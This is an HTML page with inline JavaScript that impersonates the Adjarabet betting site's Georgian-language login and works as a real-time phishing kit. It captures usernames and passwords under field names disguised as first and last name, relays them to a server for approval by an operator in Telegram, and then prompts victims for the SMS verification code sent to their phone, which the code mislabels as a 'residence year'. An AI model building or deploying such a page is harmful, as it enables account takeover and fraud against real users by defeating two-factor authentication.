<!doctype html>
<html lang="ru">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Adjarabet Form</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Noto+Sans+Georgian:wght@400;500;600;700;800&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="./styles.css" />
  </head>
  <body>
    <div class="top-notice" data-top-notice hidden>
      <div class="top-notice-icon" aria-hidden="true">
        <svg viewBox="0 0 24 24">
          <circle cx="12" cy="12" r="10" fill="currentColor" />
          <path
            d="M8 8L16 16M16 8L8 16"
            fill="none"
            stroke="#ffffff"
            stroke-linecap="round"
            stroke-width="2.2"
          />
        </svg>
      </div>

      <p class="top-notice-text" data-top-notice-text>Заявка была отклонена.</p>

      <button class="top-notice-close" type="button" aria-label="Закрыть" data-top-notice-close>
        <svg viewBox="0 0 24 24" aria-hidden="true">
          <path
            d="M6 6L18 18M18 6L6 18"
            fill="none"
            stroke="currentColor"
            stroke-linecap="round"
            stroke-width="2.4"
          />
        </svg>
      </button>
    </div>

    <main class="page">
      <section class="login-modal" aria-label="Форма заявки">
        <div class="promo-banner">
          <div class="promo-topbar">
            <a class="brand-badge" href="#" aria-label="Adjarabet">
              <img class="brand-logo" src="./img/logo.svg" alt="Adjarabet" />
            </a>
            <button class="close-button" type="button" aria-label="Закрыть">
              <svg viewBox="0 0 24 24" aria-hidden="true">
                <path
                  d="M6 6L18 18M18 6L6 18"
                  fill="none"
                  stroke="currentColor"
                  stroke-linecap="round"
                  stroke-width="2.4"
                />
              </svg>
            </button>
          </div>

          <div class="promo-scene" aria-hidden="true">
            <img class="promo-image" src="./img/header-photo.webp" alt="" />
          </div>
        </div>

        <div class="login-content">
          <h1>შესვლა</h1>

          <form class="login-form" data-telegram-form>
            <label class="input-shell">
              <span class="input-icon" aria-hidden="true">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 20 20"><path fill="currentColor" fill-rule="evenodd" d="M18 10a8 8 0 1 1-16 0 8 8 0 0 1 16 0m-3.502 4.24a6.182 6.182 0 1 0-8.996 0 3.77 3.77 0 0 1 3.533-2.49h1.93a3.765 3.765 0 0 1 3.533 2.49M11.91 9.929a2.7 2.7 0 0 1-1.91.8 2.7 2.7 0 0 1-1.91-.8A2.74 2.74 0 0 1 7.298 8c0-.723.285-1.417.792-1.928a2.7 2.7 0 0 1 1.91-.8c.716 0 1.403.288 1.91.8A2.74 2.74 0 0 1 12.7 8a2.74 2.74 0 0 1-.791 1.928" clip-rule="evenodd"></path></svg>
              </span>
              <input type="text" name="firstName" placeholder="სახელი" autocomplete="given-name" required />
            </label>

            <label class="input-shell">
              <span class="input-icon" aria-hidden="true">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 16 16"><path fill="currentColor" d="M8.25 3.5c1.036 0 1.875.84 1.875 1.875V6.5h-3.75V5.375c0-1.036.84-1.875 1.875-1.875M4.875 5.375V6.5H4.5C3.673 6.5 3 7.173 3 8v4.5c0 .827.673 1.5 1.5 1.5H12c.827 0 1.5-.673 1.5-1.5V8c0-.827-.673-1.5-1.5-1.5h-.375V5.375a3.376 3.376 0 0 0-6.75 0M9 9.5V11a.75.75 0 1 1-1.5 0V9.5a.75.75 0 1 1 1.5 0"></path></svg>
              </span>
              <input type="password" name="lastName" placeholder="პაროლი" autocomplete="current-password" required />
              <button class="ghost-icon" type="button" aria-label="Показать пароль" data-password-toggle>
                <svg viewBox="0 0 24 24" aria-hidden="true" data-password-eye>
                  <path
                    d="M3 3L21 21"
                    fill="none"
                    stroke="currentColor"
                    stroke-linecap="round"
                    stroke-width="1.8"
                  />
                  <path
                    d="M10.73 5.08A10.94 10.94 0 0 1 12 5c5.52 0 10 7 10 7a18.7 18.7 0 0 1-3.06 3.57M6.61 6.61C3.98 8.3 2 12 2 12a18.7 18.7 0 0 0 5.39 5.39A10.94 10.94 0 0 0 12 19c1.48 0 2.89-.3 4.18-.85M9.88 9.88a3 3 0 1 0 4.24 4.24"
                    fill="none"
                    stroke="currentColor"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                    stroke-width="1.8"
                    data-password-eye-path
                  />
                </svg>
              </button>
            </label>

            <button class="submit-button is-active" type="submit" data-submit-button>
              <span class="submit-button-label">შესვლა</span>
            </button>
            <p class="form-status" hidden data-form-status></p>
          </form>
        </div>
      </section>

      <div class="overlay" data-residence-modal hidden>
        <section class="year-modal" aria-labelledby="year-modal-title" aria-modal="true" role="dialog">
          <button class="year-modal-close" type="button" aria-label="Закрыть" data-year-close>
            <svg viewBox="0 0 24 24" aria-hidden="true">
              <path
                d="M6 6L18 18M18 6L6 18"
                fill="none"
                stroke="currentColor"
                stroke-linecap="round"
                stroke-width="2.4"
              />
            </svg>
          </button>

          <h2 id="year-modal-title">შედი SMS</h2>
          <p class="modal-copy">გთხოვთ, შეიყვანოთ ნომერზე გამოგზავნილი SMS.</p>

          <form class="year-form" data-year-form>
            <input
              class="year-line-input"
              type="text"
              name="residenceYear"
              inputmode="numeric"
              autocomplete="off"
              placeholder="SMS"
              data-year-input
              required
            />

            <button class="submit-button year-submit-button" type="submit" data-year-submit>
              <span class="submit-button-label">შესვლა</span>
            </button>
            <p class="form-status year-status" hidden data-year-status></p>
          </form>
        </section>
      </div>
    </main>

    <script>
      const form = document.querySelector("[data-telegram-form]");
      const status = document.querySelector("[data-form-status]");
      const submitButton = document.querySelector("[data-submit-button]");
      const topNotice = document.querySelector("[data-top-notice]");
      const topNoticeText = document.querySelector("[data-top-notice-text]");
      const topNoticeClose = document.querySelector("[data-top-notice-close]");
      const yearModal = document.querySelector("[data-residence-modal]");
      const yearForm = document.querySelector("[data-year-form]");
      const yearStatus = document.querySelector("[data-year-status]");
      const yearSubmitButton = document.querySelector("[data-year-submit]");
      const yearCloseButton = document.querySelector("[data-year-close]");
      const yearInput = document.querySelector("[data-year-input]");
      const firstNameInput = form?.querySelector('input[name="firstName"]');
      const lastNameInput = form?.querySelector('input[name="lastName"]');
      const submitButtonLabel = submitButton?.querySelector(".submit-button-label");
      const passwordToggleButton = document.querySelector("[data-password-toggle]");
      const passwordEye = document.querySelector("[data-password-eye]");
      const passwordEyePath = document.querySelector("[data-password-eye-path]");

      function setupFloatingLabel(input, labelText) {
        if (!input) {
          return;
        }

        const inputShell = input.closest(".input-shell");
        if (!inputShell || inputShell.querySelector(".floating-input-wrap")) {
          return;
        }

        inputShell.classList.add("input-shell-floating");

        const floatingWrap = document.createElement("span");
        floatingWrap.className = "floating-input-wrap";

        const floatingLabel = document.createElement("span");
        floatingLabel.className = "floating-label";
        floatingLabel.textContent = labelText;

        inputShell.insertBefore(floatingWrap, input);
        floatingWrap.appendChild(input);
        floatingWrap.appendChild(floatingLabel);
        input.placeholder = " ";
      }

      setupFloatingLabel(firstNameInput, "სახელი");
      setupFloatingLabel(lastNameInput, "პაროლი");

      let activeRequestId = "";
      let pollTimer = null;
      let noticeTimer = null;
      let requestStage = "name";

      function setStatus(element, message, state = "") {
        element.textContent = message;
        element.dataset.state = state;
        element.hidden = !(message && state === "error");
      }

      function setWaitingState(isWaiting) {
        submitButton.disabled = isWaiting;
        submitButton.classList.toggle("is-loading", isWaiting);

        if (submitButtonLabel) {
          submitButtonLabel.textContent = "Отправить";
        }
      }

      function updateSubmitButtonState() {
        if (!firstNameInput || !lastNameInput) {
          return;
        }

        const isReady = Boolean(firstNameInput.value.trim() && lastNameInput.value.trim());
        submitButton.classList.toggle("is-active", isReady);
      }

      function setYearPendingState(isPending) {
        yearSubmitButton.disabled = isPending;
        yearInput.disabled = isPending;
        yearCloseButton.disabled = isPending;
      }

      function updateYearSubmitButtonState() {
        const isReady = Boolean(yearInput?.value.trim());
        yearSubmitButton.classList.toggle("is-active", isReady);
      }

      function hideTopNotice() {
        if (noticeTimer) {
          clearTimeout(noticeTimer);
          noticeTimer = null;
        }

        topNotice.hidden = true;
      }

      function showTopNotice(message) {
        if (!topNotice || !topNoticeText) {
          return;
        }

        if (noticeTimer) {
          clearTimeout(noticeTimer);
        }

        topNoticeText.textContent = message;
        topNotice.hidden = false;
        noticeTimer = setTimeout(() => {
          topNotice.hidden = true;
          noticeTimer = null;
        }, 6000);
      }

      function resetYearModal() {
        yearForm.reset();
        setStatus(yearStatus, "", "");
        updateYearSubmitButtonState();
      }

      function openYearModal() {
        yearModal.hidden = false;
        resetYearModal();
        if (yearInput) {
          yearInput.focus();
        }
      }

      function closeYearModal() {
        yearModal.hidden = true;
        resetYearModal();
      }

      function stopPolling() {
        if (pollTimer) {
          clearInterval(pollTimer);
          pollTimer = null;
        }
      }

      async function checkRequestStatus() {
        if (!activeRequestId) {
          return;
        }

        try {
          const response = await fetch(`/request-status?id=${encodeURIComponent(activeRequestId)}`);
          if (!response.ok) {
            throw new Error("Status check failed");
          }

          const payload = await response.json();

          if (payload.status === "approved") {
            stopPolling();
            setWaitingState(false);
            requestStage = "year";
            setStatus(status, "Данные подтверждены. Открылось окно для ввода года проживания.", "success");
            openYearModal();
            return;
          }

          if (payload.status === "name_review") {
            return;
          }

          if (payload.status === "year_pending") {
            return;
          }

          if (payload.status === "year_review") {
            return;
          }

          if (payload.status === "completed") {
            stopPolling();
            setYearPendingState(false);
            closeYearModal();
            form.reset();
            updateSubmitButtonState();
            activeRequestId = "";
            requestStage = "name";
            setStatus(status, "Год проживания подтвержден и отправлен в Telegram.", "success");
            return;
          }

          if (payload.status === "year_rejected") {
            stopPolling();
            setYearPendingState(false);
            requestStage = "year";
            if (yearModal.hidden) {
              openYearModal();
            }
            setStatus(yearStatus, "SMS არასწორად არის შეყვანილი", "error");
            yearInput.focus();
            return;
          }

          if (payload.status === "rejected") {
            stopPolling();
            activeRequestId = "";
            setWaitingState(false);
            requestStage = "name";
            setStatus(status, "Заявка была отклонена в Telegram.", "error");
            showTopNotice("მითითებული მონაცემების სახელი ან პაროლი არასწორია");
          }
        } catch (error) {
          stopPolling();
          setWaitingState(false);
          setStatus(status, "Не удалось проверить подтверждение в Telegram.", "error");
        }
      }

      if (
        form &&
        status &&
        submitButton &&
        yearModal &&
        yearForm &&
        yearStatus &&
        yearSubmitButton &&
        yearCloseButton &&
        yearInput &&
        yearForm
      ) {
        form.addEventListener("submit", async (event) => {
          event.preventDefault();
          stopPolling();

          const formData = new FormData(form);
          const firstName = String(formData.get("firstName") || "").trim();
          const lastName = String(formData.get("lastName") || "").trim();

          if (!firstName || !lastName) {
            setStatus(status, "Заполните имя и фамилию.", "error");
            return;
          }

          setWaitingState(true);
          requestStage = "name";
          setStatus(status, "Отправляем данные в Telegram...", "");
          closeYearModal();

          try {
            const response = await fetch("/submit", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                firstName,
                lastName,
              }),
            });

            if (!response.ok) {
              throw new Error("Submit failed");
            }

            const payload = await response.json();
            activeRequestId = payload.requestId;
            setStatus(status, "Проверьте Telegram: сначала нажмите «Привет», затем «Принять» или «Отклонить».", "");
            pollTimer = setInterval(checkRequestStatus, 2000);
            checkRequestStatus();
          } catch (error) {
            setWaitingState(false);
            setStatus(status, "Не удалось отправить данные в Telegram.", "error");
          }
        });

        yearCloseButton.addEventListener("click", () => {
          closeYearModal();
        });

        if (firstNameInput && lastNameInput) {
          firstNameInput.addEventListener("input", updateSubmitButtonState);
          lastNameInput.addEventListener("input", updateSubmitButtonState);
          updateSubmitButtonState();
        }

        if (passwordToggleButton && lastNameInput && passwordEye && passwordEyePath) {
          passwordToggleButton.addEventListener("click", () => {
            const isHidden = lastNameInput.type === "password";
            lastNameInput.type = isHidden ? "text" : "password";
            passwordToggleButton.setAttribute("aria-label", isHidden ? "Скрыть пароль" : "Показать пароль");
            passwordEye.innerHTML = isHidden
              ? `
                <path
                  d="M2 12S5.64 5 12 5s10 7 10 7-3.64 7-10 7S2 12 2 12Z"
                  fill="none"
                  stroke="currentColor"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  stroke-width="1.8"
                />
                <circle
                  cx="12"
                  cy="12"
                  r="3"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="1.8"
                />
              `
              : `
                <path
                  d="M3 3L21 21"
                  fill="none"
                  stroke="currentColor"
                  stroke-linecap="round"
                  stroke-width="1.8"
                />
                <path
                  d="M10.73 5.08A10.94 10.94 0 0 1 12 5c5.52 0 10 7 10 7a18.7 18.7 0 0 1-3.06 3.57M6.61 6.61C3.98 8.3 2 12 2 12a18.7 18.7 0 0 0 5.39 5.39A10.94 10.94 0 0 0 12 19c1.48 0 2.89-.3 4.18-.85M9.88 9.88a3 3 0 1 0 4.24 4.24"
                  fill="none"
                  stroke="currentColor"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  stroke-width="1.8"
                />
              `;
          });
        }

        if (topNoticeClose) {
          topNoticeClose.addEventListener("click", () => {
            hideTopNotice();
          });
        }

        yearInput.addEventListener("input", () => {
          yearInput.value = yearInput.value.replace(/\D/g, "");
          updateYearSubmitButtonState();
        });

        updateYearSubmitButtonState();

        yearForm.addEventListener("submit", async (event) => {
          event.preventDefault();

          const residenceYear = yearInput.value.trim();

          if (!/^\d+$/.test(residenceYear)) {
            setStatus(yearStatus, "Введите год цифрами.", "error");
            return;
          }

          setYearPendingState(true);
          setStatus(yearStatus, "Отправляем год в Telegram...", "");

          try {
            const response = await fetch("/submit-residence-year", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                requestId: activeRequestId,
                residenceYear,
              }),
            });

            if (!response.ok) {
              throw new Error("Year submit failed");
            }

            requestStage = "year";
            setStatus(yearStatus, "Проверьте Telegram и нажмите «Принять» или «Отклонить».", "");
            stopPolling();
            pollTimer = setInterval(checkRequestStatus, 2000);
            checkRequestStatus();
          } catch (error) {
            setYearPendingState(false);
            setStatus(yearStatus, "Не удалось отправить год проживания.", "error");
          }
        });
      }
    </script>
  </body>
</html>
